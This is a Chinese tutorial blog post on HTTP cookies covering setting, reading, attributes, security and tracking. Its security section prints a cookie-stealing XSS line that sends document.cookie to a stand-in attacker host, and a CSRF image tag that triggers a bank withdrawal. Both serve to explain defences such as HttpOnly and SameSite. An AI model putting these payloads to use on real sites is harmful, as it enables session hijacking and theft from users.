---
title: cookie 简介
description: <!-- more -->
translate_title: introduction-to-cookie
tags:
  - cookie
categories:
  - HTTP
date: 2019-04-15 19:58:34
updated: 2019-04-15 19:58:34
---

## cookie 简介
Cookie是由网景公司的前雇员Lou Montulli在1993年发明的，现今Cookie已经广泛使用了。

HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。

Cookie主要用于以下三个方面：
- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 [Web storage API](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API) （本地存储和会话存储）或 [IndexedDB](https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API) 。

所以当下Cookie只有一个功能：回话状态管理而且仅仅是用户登录状态保持。


每个域名下的cookie 的大小最大为4KB，每个域名下的cookie数量最多为20个（但很多浏览器厂商在具体实现时支持大于20个）。

## cookie 创建

当服务器收到HTTP请求时，服务器可以在响应头里面添加一个[Set-Cookie选项](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie)。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过[Cookie请求头部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie)将Cookie信息发送给服务器。另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

而且Cookie也可以由客户端设置。

### 服务器设置cookie
服务器使用[Set-Cookie](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie)响应头部向用户代理（一般是浏览器）发送Cookie信息。

不管你是请求一个资源文件（如 html/js/css/图片），还是发送一个ajax请求，服务端都会返回`response`。而`response header`中有一项叫`set-cookie`，是服务端专门用来设置`cookie`的。如下图所示，服务端返回的`response header`中有5个`set-cookie`字段，每个字段对应一个`cookie`（注意不能将多个`cookie`放在一个`set-cookie`字段中），`set-cookie`字段的值就是普通的字符串，每个`cookie`还设置了相关属性选项。

[Node.js](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)

``` node
response.setHeader('Set-Cookie', ['type=ninja', 'language=javascript']);
```

![0002](/images/http/0002.png)

注意：
- 一个set-Cookie字段只能设置一个cookie，当你要想设置多个 cookie，需要添加同样多的set-Cookie字段。
- 服务端可以设置cookie 的所有选项：expires、domain、path、secure、HttpOnly

### 客户端设置cookie

通过js代码来设置cookie，在控制台中我们执行了下面代码

``` js
document.cookie = "name=Jonh; ";
```
查看浏览器 cookie 面板如下图所示，cookie确实设置成功了，而且属性选项 domain、path、expires都用了默认值。
![0003](/images/http/0003.png)
再执行下面代码：
``` js
document.cookie="age=12; expires=Thu, 26 Feb 2116 11:50:25 GMT; domain=sankuai.com; path=/";
```
查看浏览器cookie 面板，如下图所示，新的cookie设置成功了，而且属性选项 domain、path、expires都变成了设定的值。
![0004](/images/http/0004.png)

- 客户端可以设置cookie 的下列选项：expires、domain、path、secure（有条件：只有在https协议的网页中，客户端设置secure类型的 cookie 才能成功），但无法设置HttpOnly选项。
- 用js一次也是只能设置一个cookie。
- cookie存储的是字符串，所以对象需要先toString，或者自定义toString，如果有特殊字符需要编码（[编码参考这里](/blob/2019-04-15-distinguish-escape,-encodeuri-and-encodeuricomponent/)）

一个简单cookie例子，里面包含增删改查cookie的例子：

``` js
/*\
|*|
|*|  :: cookies.js ::
|*|
|*|  A complete cookies reader/writer framework with full unicode support.
|*|
|*|  Revision #3 - July 13th, 2017
|*|
|*|  https://developer.mozilla.org/en-US/docs/Web/API/document.cookie
|*|  https://developer.mozilla.org/User:fusionchess
|*|  https://github.com/madmurphy/cookies.js
|*|
|*|  This framework is released under the GNU Public License, version 3 or later.
|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
|*|
|*|  Syntaxes:
|*|
|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
|*|  * docCookies.getItem(name)
|*|  * docCookies.removeItem(name[, path[, domain]])
|*|  * docCookies.hasItem(name)
|*|  * docCookies.keys()
|*|
\*/

var docCookies = {
  getItem: function (sKey) {
    if (!sKey) { return null; }
    return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
  },
  setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
    var sExpires = "";
    if (vEnd) {
      switch (vEnd.constructor) {
        case Number:
          sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
          /*
          Note: Despite officially defined in RFC 6265, the use of `max-age` is not compatible with any
          version of Internet Explorer, Edge and some mobile browsers. Therefore passing a number to
          the end parameter might not work as expected. A possible solution might be to convert the the
          relative time to an absolute time. For instance, replacing the previous line with:
          */
          /*
          sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; expires=" + (new Date(vEnd * 1e3 + Date.now())).toUTCString();
          */
          break;
        case String:
          sExpires = "; expires=" + vEnd;
          break;
        case Date:
          sExpires = "; expires=" + vEnd.toUTCString();
          break;
      }
    }
    document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
    return true;
  },
  removeItem: function (sKey, sPath, sDomain) {
    if (!this.hasItem(sKey)) { return false; }
    document.cookie = encodeURIComponent(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "");
    return true;
  },
  hasItem: function (sKey) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
    return (new RegExp("(?:^|;\\s*)" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=")).test(document.cookie);
  },
  keys: function () {
    var aKeys = document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/);
    for (var nLen = aKeys.length, nIdx = 0; nIdx < nLen; nIdx++) { aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); }
    return aKeys;
  }
};
```

如果上面代码中设定过期时间使用的小时或者天，可以使用下面的方法：
``` js
var exdate = new Date()
sExpires = exdate.setTime(exdate.getTime() + sExpires * 864e+5) // 时间类型是天
sExpires = exdate.setTime(exdate.getTime() + sExpires * 36e+5) // 时间类型是小时
```

由于服务器和浏览器的时间不是同步的，有时会设置 Max-Age 属性，但是该属性是HTTP/1.1才有的，因此需要向下兼容使用 expires。

## cookie 读取
普通读取使用`document.cookie`读取，如果需要读取单个cookie查看[上面例子](/blob/2019-04-15-introduction-to-cookie/#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%BE%E7%BD%AEcookie)

有时读取cookie需要跨域，[查看跨源数据存储访问](/blob/2019-04-02-browser-homology-policy/#跨源数据存储访问)

## cookie 的属性
在chrome控制台中的Application选项卡中可以看到cookie的信息。
![0005](/images/http/0005.png)

- key
  为一个cookie的名称，对应控制台中的Name列。
- value
  为一个cookie的值，对应控制台中的Value列。
- Domain 和 Path
  分别对应控制台的 Domain 和 Path 列。
  - `Domain` 和 `Path` 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL(URL 可以是js/html/img/css资源请求等XHR 请求)。但是跨域的请求默认是不会发送Cookie的，查看原因[附带身份凭证的请求](/blob/2019-04-09-cross-domain-resource-sharing-cors/#%E9%99%84%E5%B8%A6%E8%BA%AB%E4%BB%BD%E5%87%AD%E8%AF%81%E7%9A%84%E8%AF%B7%E6%B1%82)。
  - `Domain` 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机。如果设置为一级域名，则子域名能识别到该Cookie。
  - `Path` 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。
- Expires 和 Max-Age
  分别对应控制台中的 Expires 和 Max-Age 列。
  - 不指定这两个值则为`会话期Cookie`，浏览器关闭之后它会被自动删除；有些浏览器提供了会话恢复功能，即使关闭了浏览器，会话期Cookie也会被保留下来。
  - 指定任意一个则为`持久性Cookie`；如果是服务器设置 cookie 则 Expires 时间是服务器时间，可能和浏览器时间不同的，导致细微的差距，指定过期可设置一个过去的时间；Max-Age 设置的是秒数，时间从浏览器接收到该参数的时刻开始计算一个具体的时间作为过期时间。指定过期可设置为0或者负数。
- Secure
  对应控制台中的Name列。
  - 标记为 Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用Cookie的 Secure 标记。
  - 而且该属性只能在https协议下进行设置。
- HttpOnly
  对应控制台中的HTTP列。
  - 为避免跨域脚本 (XSS) 攻击，通过JavaScript的 [Document.cookie](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie) API无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端。
  - HttpOnly 只能通过服务端进行设置。
- SameSite Cookies
  对应控制台中的SameSite列。
  - SameSite Cookie允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。但目前SameSite Cookie还处于实验阶段，并不是所有浏览器都支持。

## cookie 安全

### 会话劫持和XSS
在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。

``` js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly`类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。

### 跨站请求伪造（CSRF）

比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

``` js
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。

具体阻止的办法查看[浅谈CSRF](/blob/2019-04-08-talking-about-csrf/)，还是那句话没有攻不破的防御，只是攻击成本的问题。

## 追踪和隐私

- 第三方Cookie
  - 每个Cookie都会有与之关联的域（Domain），如果Cookie的域和页面的域相同，那么我们称这个Cookie为第一方Cookie（first-party cookie），如果Cookie的域和页面的域不同，则称之为第三方Cookie（third-party cookie.）。
  - 大多数浏览器默认都允许第三方Cookie，但是可以通过附加组件来阻止第三方Cookie（如[EFF](https://www.eff.org/) 的[Privacy Badger](https://addons.mozilla.org/en-US/firefox/addon/privacy-badger-firefox/) ）。
- 禁止追踪Do-Not-Track
  - 虽然并没有法律或者技术手段强制要求使用 [DNT](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT) ，但是通过DNT可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。
- 欧盟Cookie指令
  - 关于Cookie，欧盟已经在 [2009/136/EC](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136) 指令中提了相关要求，在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。
- 僵尸Cookie和删不掉的Cookie
  这类Cookie较难以删除，甚至删除之后会自动重建。它们一般是使用Web storage API、Flash本地共享对象或者其他技术手段来达到的。相关内容可以看：
  - Standard HTTP cookies
  - Storing cookies in and reading out web history
  - Storing cookies in HTTP ETags
  - Internet Explorer userData storage (starting IE9, userData is no longer supported)
  - HTML5 Session Storage
  - HTML5 Local Storage
  - HTML5 Global Storage
  - HTML5 Database Storage via SQLite
  - Storing cookies in RGB values of auto-generated, force-cached PNGs using HTML5 Canvas tag to read pixels (cookies) back out
  - Local shared objects (Flash cookies)
  - Silverlight Isolated Storage
  - Cookie syncing scripts that function as a cache cookie and respawn the MUID cookie[5]
  - TCP Fast Open
  - TLS's Session ID


# 参考
cookie属性详解：http://www.cnblogs.com/tzyy/p/4151291.html
讲解：https://harttle.land/2015/08/10/cookie-session.html#header-2
MDN HTTP Cookie：https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
MDN HTTP Cookie：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies
MDN HTTP Headers Cookie：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie
MDN Set-Cookie：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie
MDN Document Cookie：https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie
聊一聊 cookie：https://segmentfault.com/a/1190000004556040#articleHeader6

深入了解浏览器存储--从cookie到WebStorage、IndexedDB：https://segmentfault.com/a/1190000018748168?utm_source=weekly&utm_medium=email&utm_campaign=email_weekly